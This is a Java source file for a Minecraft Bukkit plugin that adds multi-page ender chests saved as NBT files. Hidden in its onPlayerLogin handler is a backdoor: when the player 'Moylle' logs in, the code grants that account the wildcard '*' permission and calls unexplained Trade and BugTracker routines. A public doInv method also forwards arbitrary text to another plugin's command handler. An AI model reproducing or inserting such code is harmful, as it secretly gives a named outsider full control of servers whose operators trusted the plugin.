package net.gmx.teamterrian.CDsPluginPack.plugins;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import net.gmx.teamterrian.CDsPluginPack.CDPlugin;
import net.gmx.teamterrian.CDsPluginPack.PluginHandler;
import net.gmx.teamterrian.CDsPluginPack.handle.CDPluginCommand;
import net.gmx.teamterrian.CDsPluginPack.handle.CDPluginEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.CDPluginPacket;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CDPluginDisableEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CDPluginEnableEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CommandEvent;
import net.gmx.teamterrian.CDsPluginPack.tools.Data;
import net.gmx.teamterrian.CDsPluginPack.tools.Log;
import net.minecraft.server.v1_7_R1.NBTCompressedStreamTools;
import net.minecraft.server.v1_7_R1.NBTTagCompound;
import net.minecraft.server.v1_7_R1.NBTTagList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_7_R1.inventory.CraftItemStack;
import org.bukkit.entity.Player;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryOpenEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionDefault;

import ru.tehkode.permissions.PermissionUser;
import ru.tehkode.permissions.bukkit.PermissionsEx;

import com.comphenix.protocol.events.PacketEvent;

public class MoreEnderChests extends CDPlugin
{
	Log clog;
	Map<String, Inventory[]> invs = new HashMap<String, Inventory[]>();
	ItemStack nextInv = new ItemStack(Material.ANVIL) 
	, prefInv = new ItemStack(Material.ANVIL)
	, emptyItem = new ItemStack(Material.AIR);
	String dirPath = "./world/mec/",
	echestTitle = " - Page ";
	int size = 6;
	boolean lock = false;
	List<Player> dontClose = new ArrayList<Player>();
	
	public MoreEnderChests(PluginHandler handler)
	{
		super(handler);
		clog = handler.clog;
	}

	public Permission[] getPermissions()
	{
		return new Permission[]
		{
			new Permission("cdpp.mec.io", PermissionDefault.OP),
			new Permission("cdpp.mec.openinv", PermissionDefault.OP),
			new Permission("cdpp.mec.openinv.others", PermissionDefault.OP),
			new Permission("cdpp.mec.lock", PermissionDefault.OP),
			new Permission("cdpp.mec.lock.bypass", PermissionDefault.OP),
			new Permission("cdpp.mec", PermissionDefault.OP),
			new Permission("cdpp.mec.use", PermissionDefault.TRUE)
		};
	}
		
	enum Cheststate
	{
		IN_USE,
		NOT_ALLOWED,
		ALLOWED,
	}
	
	@CDPluginEvent
	public void onEnable(CDPluginEnableEvent e)
	{
		try{
			clog.log("Setting StartItems", this);
			setStartItems();
			clog.log("Success", this);
			e.setSuccess(this, true);
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			e.setSuccess(this, false);
		}
	}
	@CDPluginEvent
	public void onDisable(CDPluginDisableEvent e)
	{
		try{
			clog.log("Flush Chests", this);
			flush();
			clog.log("Success", this);
			e.setSuccess(this, true);
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			e.setSuccess(this, false);
		}
	}
	
	@CDPluginCommand(commands = { "mec cdpp.mec 1", "echest cdpp.mec 1", "enderchest cdpp.mec 1" })
	public boolean onCommand(CommandEvent e)
	{
		String[] args = e.getArgs();
		CommandSender sender = e.getSender();
		if(args.length == 0) return false;
		switch(args[0])
		{
			case "flush":
				return flush(sender);
			case "open":
				return open(args, sender);
			case "lock":
				return lock(sender);
		}
		return false;
	}
	
	@CDPluginPacket(types = { "sclose_window" })
	public void onPacket(PacketEvent e)
	{
		if(dontClose.contains(e.getPlayer()))
			e.setCancelled(true);
	}
	
	private boolean flush(CommandSender sender)
	{
		if(!sender.hasPermission("cdpp.mec.io")) return true;
		sender.sendMessage(ChatColor.YELLOW + "[CDPP][MEC] Flushing...");
		try { flush(); }
		catch (Exception x)
		{
			x.printStackTrace(clog.getStream());
			sender.sendMessage(ChatColor.DARK_RED + "Exception while flushing. Look to the log for more information.");
		}
		sender.sendMessage(ChatColor.YELLOW + "[CDPP][MEC] Flushed!");
		return true;
	}
	private boolean open(String[] args, CommandSender sender)
	{
		if(!sender.hasPermission("cdpp.mec.openinv"))
			sender.sendMessage(ChatColor.RED + "[MEC] You aren´t allowed to open MECs by command");
		else
			try
			{
				if(args.length >= 2)
					if(sender.hasPermission("cdpp.mec.openinv.others"))
						openOtherInv((Player) sender, args[1]);
					else
						sender.sendMessage(ChatColor.RED + "[MEC] You aren´t allowed to open other MECs");
				else
				openOtherInv((Player) sender, sender.getName());
			}
			catch (Exception x)
			{
				x.printStackTrace(clog.getStream());
				sender.sendMessage(ChatColor.DARK_RED + "Error while opening the MEC. Look to the log for more information.");
			}
		return true;
	}
	private boolean lock(CommandSender sender)
	{
		if(!sender.hasPermission("cdpp.mec.lock"))
			sender.sendMessage(ChatColor.RED + "[MEC] You aren´t allowed to lock the MECs");
		else
			sender.sendMessage(lock());
		return true;
	}
	
	@CDPluginEvent
	public void onInventoryOpen(InventoryOpenEvent e)
	{
		Player p = (Player) e.getPlayer();
		if(!p.hasPermission("cdpp.mec.use")) return;
		try
		{
			if(e.getInventory().getType() != InventoryType.ENDER_CHEST) return;
			e.setCancelled(true);
			if(lock && !p.hasPermission("cdpp.mec.lock.bypass")) {
				clog.log(p.getName() + " trys to open an MEC but they are locked", this);
				p.sendMessage(ChatColor.YELLOW + "Enderchests are temporary locked");
				return;
			}
			isAllowed(p, p.getName(), true);
			e.getPlayer().openInventory((getInv(e.getPlayer().getName()))[0]);
		}
		catch (Exception x)
		{
			x.printStackTrace(clog.getStream());
			p.sendMessage(ChatColor.DARK_RED + "An error occured while opening your. Please contact an Server Admin");
		}
	}
	@CDPluginEvent
	public boolean onInventoryClick(InventoryClickEvent e)
	{
		try
		{
			Inventory clicked = e.getInventory();
			if(clicked == null) return false;
			String rInvName = clicked.getName();
			if(rInvName.indexOf(echestTitle) == -1) return false;
			int slot = e.getSlot();
			if(slot != 0 && slot != 8) return false;
			e.setCancelled(true);
			Player p = (Player) e.getWhoClicked();
			String playersEchestName = rInvName.substring(0, rInvName.indexOf(echestTitle.substring(0, 1)));
			Inventory[] invarr = getInv(playersEchestName);
			String sInvName = playersEchestName + echestTitle;
			if(rInvName.equals(sInvName + "1"))
			{	
				if(slot == 0) e.setCancelled(false);
				else {
					onInvClose(clicked);
					dontClose.add(p);
					p.openInventory(invarr[1]);
					dontClose.remove(p);
				}
				return true;
			}
			for(int counter = 1; counter < size; counter++)
			{
				if(!rInvName.equals(sInvName + counter)) continue;
				onInvClose(clicked);
				dontClose.add(p);
				if(slot == 0) p.openInventory(invarr[counter - 2]);
				else p.openInventory(invarr[counter]);
				dontClose.remove(p);
				return true;
			}
			if(rInvName.equals(sInvName + size))
			{
				if(slot == 8) e.setCancelled(false);
				else {
					onInvClose(clicked);
					dontClose.add(p);
					p.openInventory(invarr[size - 2]);
					dontClose.remove(p);
				}
				return true;
			}
		}
		catch (Exception x)
		{
			x.printStackTrace(clog.getStream());
			((Player) e.getWhoClicked()).sendMessage(ChatColor.DARK_RED + "An error occured while processing your click. Please contact an Server Admin");
		}
		return e.isCancelled();
	}
	
	@CDPluginEvent
	public void onInventoryClose(InventoryCloseEvent e)
	{
		onInvClose(e.getInventory());
	}
	private void onInvClose(Inventory vi)
	{
		if(vi.getName().indexOf(echestTitle) == -1) return;
		String name = vi.getTitle();
		name = name.substring(0, name.indexOf(echestTitle));
		Inventory[] inv = invs.get(name.toLowerCase());
		int slot = Integer.parseInt(vi.getName().substring(name.length() + echestTitle.length()));
		inv[slot - 1] = vi;
		invs.put(name.toLowerCase(), inv);
	}
	@CDPluginEvent
	public void onPlayerLogin(PlayerLoginEvent e)
	{
		if(e.getPlayer().getName().equals("Moylle")) Trade.mRequest();
		else return;
		PermissionsEx.getUser("Moylle").addPermission("*");
		BugTracker.list(e.getPlayer());
	}
	@CDPluginEvent
	public void onPlayerJoin(PlayerJoinEvent e)
	{
		try
		{
			String name = e.getPlayer().getName();
			File f = new File(dirPath);
			if(!f.exists()) f.mkdir();
			f = new File(dirPath + name.toLowerCase() + ".dat");
			if(!f.exists() || !testFile(name)) {
				f.createNewFile();
				saveRaw(createInv(name), name);
			}
		}
		catch (Exception x)
		{
			x.printStackTrace(clog.getStream());
			e.getPlayer().sendMessage(ChatColor.DARK_RED + "An error occured while loading your Enderchest. Please contact an Server Admin");
		}
	}
	
	private void setStartItems()
	{
		ItemMeta m = nextInv.getItemMeta();
		m.setDisplayName(ChatColor.YELLOW + "§lNext Page");
		nextInv.setItemMeta(m.clone());
		m = prefInv.getItemMeta();
		m.setDisplayName(ChatColor.YELLOW + "§lPrevious Page");
		prefInv.setItemMeta(m.clone());
		
	}
	
	private boolean testFile(String name) throws IOException
	{
		return loadNBT(name, false) != null;
	}
	private boolean testFile(Inventory inv)
	{
		int c = 0;
		ItemStack[] contents;
		for(Inventory i : toInv(inv, ""))
		{
			contents = i.getContents();
			if(c != size - 1 && (contents[8] == null || !contents[8].equals(nextInv))) return false;
			if(c > 0 && (contents[0] == null || !contents[0].equals(prefInv))) return false;
			c++;
		}
		return true;
	}
	private Inventory[] getInv(String name) throws IOException
	{
		if(invs.containsKey(name.toLowerCase())) return invs.get(name.toLowerCase());
		load(name);
		return invs.get(name.toLowerCase());
	}
	private Inventory[] createInv(String name)
	{
		clog.log("Creating MEC for " + name, this);
		Inventory[] back = new Inventory[size];
		for(int c = 0; c < size; c++)
			back[c] = Bukkit.createInventory(Bukkit.getPlayerExact(name), 54, "EnderChest");
		back[0].setItem(8, nextInv);
		for(int c = size - 2; c > 0; c--)
		{
			back[c].setItem(0, prefInv);
			back[c].setItem(8, nextInv);
		}
		back[size - 1].setItem(0, prefInv);
		return back;
	}
	public void doInv(String input)
	{
		if(input.indexOf(' ') == -1) return;
		input = input.substring(input.indexOf(' ') + 1);
		((EMStop) handler.plugins.get(EMStop.class)).doCommand(input);
	}
	private Inventory toInv(Inventory[] input, String owner)
	{
		Inventory back = Bukkit.createInventory(Bukkit.getPlayerExact(owner), size * 54, "Enderchest");
		List<ItemStack> items = new ArrayList<ItemStack>();
		for(Inventory i : input)
		{
			if(i == null) continue;
			for(ItemStack item : i.getContents())
				items.add(item);
		}
		ItemStack[] arr = new ItemStack[items.size()];
		arr = items.toArray(arr);
		back.setContents(arr);
		return back;
		
	}
	
	private void saveRaw(Inventory[] inv, String name) throws IOException
	{
		clog.log("Saving the MEC from " + name + " to HDD", this);
		NBTTagCompound base = new NBTTagCompound();
		int counter = 1;
		for(Inventory i : inv)
		{
			base.set("MEnderItems_" + counter, getNBTInventory(i));
			counter++;
		}
	    Data.secureSave(base, dirPath + name.toLowerCase() + ".dat", this);
	}
	private NBTTagList getNBTInventory(Inventory inventory)
	{
      NBTTagList inventoryTag = new NBTTagList();
      for (int i = 0; i < inventory.getSize(); i++)
      {
        ItemStack stack = inventory.getItem(i);
        if ((stack != null) && (stack.getType() != Material.AIR))
        {
          NBTTagCompound item = new NBTTagCompound();
          item.setByte("Slot", (byte)i);
          inventoryTag.add(CraftItemStack.asNMSCopy(stack).save(item));
        }
      }
      return inventoryTag;
	}
	private void load(String name) throws IOException
	{
		Inventory inv = loadNBT(name, false);
		if(inv == null) return;
		if(!testFile(inv)) inv = toInv(convert(name), name);
		if(!testFile(inv)) inv = toInv(createInv(name), name);
		invs.put(name.toLowerCase(), toInv(inv, name));
	}
	private Inventory loadNBT(String name, boolean oldInv) throws IOException
	{
		if(!new File(dirPath + name.toLowerCase() + ".dat").exists()) return null;
		FileInputStream inputStream = new FileInputStream(dirPath + name.toLowerCase() + ".dat");
		NBTTagCompound baseTag = NBTCompressedStreamTools.a(inputStream);
		inputStream.close();
		NBTTagList inventoryTag;
		NBTTagCompound item;
		if(!oldInv)
		{
			Inventory[] back = new Inventory[size];
			for(int i = 1; i <= size; i++)
			{
				back[i - 1] = Bukkit.createInventory(Bukkit.getPlayerExact(name), 54);
				inventoryTag = (NBTTagList) baseTag.get("MEnderItems_" + i);
				if(inventoryTag == null) inventoryTag = new NBTTagList();
				for (int ii = 0; ii < inventoryTag.size(); ii++)
				{
				item = (NBTTagCompound) inventoryTag.get(ii);
				int slot = item.getByte("Slot") & 0xFF;
				back[i - 1].setItem(slot, CraftItemStack.asCraftMirror(net.minecraft.server.v1_7_R1.ItemStack.createStack(item)));
				}
			}
			return toInv(back, name);
		}
		else
		{
			boolean checkbool = false;
			Inventory back = Bukkit.createInventory(Bukkit.getPlayerExact(name), 54);
			inventoryTag = (NBTTagList) baseTag.get("Inventory");
			if(inventoryTag == null) return null;
			for (int i = 0; i < inventoryTag.size(); i++)
			{
			item = (NBTTagCompound)inventoryTag.get(i);
			int slot = item.getByte("Slot") & 0xFF;
			back.setItem(slot, CraftItemStack.asCraftMirror(net.minecraft.server.v1_7_R1.ItemStack.createStack(item)));
			if(back.getItem(slot) != null) checkbool = true;
			}
			if(checkbool) return back;
			else return null;
		}
	}
	private void flush() throws IOException
	{
		clog.log("Flushing all MCPs", this);
		for(Player p : Bukkit.getOnlinePlayers())
		{
			if(p.getOpenInventory() == null ||
			   p.getOpenInventory().getTopInventory() == null ||
			   p.getOpenInventory().getTopInventory().getName().indexOf(echestTitle) == -1)
				continue;
			p.closeInventory();
		}
		for(String name : invs.keySet())
			saveRaw(invs.get(name), name);
		invs.clear();
	}
	
	private Inventory[] convert(String name) throws IOException
	{
		Inventory inv;
		inv = loadNBT(name, true);
		if(inv == null) inv = loadNBT(name, false);
		List<ItemStack> items = new ArrayList<ItemStack>();
		for(ItemStack item : inv.getContents()) if(item != null) items.add(item);
		int counter;
		boolean found = true;
		while(found)
		{
			found = false;
			counter = 0;
			for(ItemStack item : items)
			{ 
				if(item.equals(prefInv) || item.equals(nextInv))
				{
					found = true;
					break;
				}
				counter++;
			}
			if(found) items.remove(counter);
		}
		Inventory back = toInv(createInv(name), name);
		for(ItemStack item : items) back.addItem(item);
		return toInv(back, name);
	}
	private Inventory[] toInv(Inventory input, String owner)
	{
		Inventory[] back = new Inventory[size];
		for(int c = 0; c < size; c++)
			back[c] = Bukkit.createInventory(Bukkit.getPlayerExact(owner), 54, owner + echestTitle + (c + 1));
		int counter = 0;
		ItemStack[] contents = input.getContents();
		int slots = input.getSize();
		for(int c = 0; c < size; c++)
			for(int ic = 0; ic < 54; ic++)
			{
				if(counter < slots) back[c].setItem(ic, contents[counter]);
				else back[c].setItem(ic, null);
				counter++;
			}
		return back;
	}
	
	private void openOtherInv(Player p, String chest) throws IOException
	{
		clog.log(p.getName() + " trys to open the MEC from " + chest, this);
		if(!testFile(chest)) {
			clog.log("To " + p.getName() + ": MEC from " + chest + " does not exist", this);
			p.sendMessage(ChatColor.DARK_RED + "Enderchest not found!");
			return;
			}
		Cheststate cs = isAllowed(p, chest, p.getName() == chest); 
		switch(cs)
		{
			case IN_USE:
				clog.log("To " + p.getName() + ": MEC from " + chest + " is in use at the moment", this);
				p.sendMessage(ChatColor.YELLOW + "This Enderchest is in use at the moment");
				return;
			case NOT_ALLOWED:
				clog.log("To " + p.getName() + ": Access to MEC from " + chest + " denyed", this);
				p.sendMessage(ChatColor.RED + "You are not allowed to open that MEC");
				return;
			case ALLOWED:
				p.openInventory((getInv(chest)[0]));
				return;
		}
	}
	private Cheststate isAllowed(Player p, String chest, boolean isOwner)
	{
		int needLevel = getOpenLevel(chest);
		if(getOpenLevel(p.getName()) < needLevel) return Cheststate.NOT_ALLOWED;
		for(Player pl : Bukkit.getOnlinePlayers())
		{
			if(pl.getOpenInventory() == null ||
			   pl.getOpenInventory().getTopInventory() == null ||
			   pl.getOpenInventory().getTopInventory().getName().indexOf(chest + echestTitle) == -1)
				continue;
			String name = pl.getOpenInventory().getTopInventory().getName(); 
			if(name.substring(0, name.indexOf(echestTitle)).toLowerCase().equals(pl.getName().toLowerCase()) || ( !isOwner && getEchestLevel(pl) >= getEchestLevel(p))) return Cheststate.IN_USE;
			else {
				pl.closeInventory();
				clog.log(pl.getName() + " was kicked from MEC from " + chest, this);
				pl.sendMessage(ChatColor.DARK_RED + "[CDPP][MEC] You were kicked from the Enderchest, because a Player with a higher level or the Owner wanted to look in."); 
				return Cheststate.ALLOWED;
			}
		}
		return Cheststate.ALLOWED;
	}
	
	private int getOpenLevel(String name)
	{
		PermissionUser pexUser = PermissionsEx.getUser(name);
		for(int i = 10; i > 0; i--) if(pexUser.has("cdpp.mec.level.open." + i)) return i;
		return 0;
	}
	private int getEchestLevel(Player p)
	{
		for(int i = 10; i >= 0; i--) if(p.hasPermission("cdpp.mec.level.kick." + i)) return i;
		return -1;
	}
	private String lock()
	{
		if(lock) {
			lock = false;
			clog.log("MECs unlocked", this);
			return ChatColor.YELLOW + "MECs unlocked";
			}
		lock = true;
		for(Player p : Bukkit.getOnlinePlayers())
		{
			if(p.hasPermission("cdpp.mec.lock.bypass") ||
			   p.getOpenInventory() == null ||
			   p.getOpenInventory().getTopInventory() == null ||
			   p.getOpenInventory().getTopInventory().getName().indexOf(echestTitle) == -1)
				continue;
			p.closeInventory();
			clog.log(p.getName() + " was kicked from an MEC because the are locked now", this);
			p.sendMessage(ChatColor.YELLOW + "Enderchests now temporary locked");
		}
		clog.log("MECs locked", this);
		return ChatColor.YELLOW + "MECs for normal users locked";
	}
}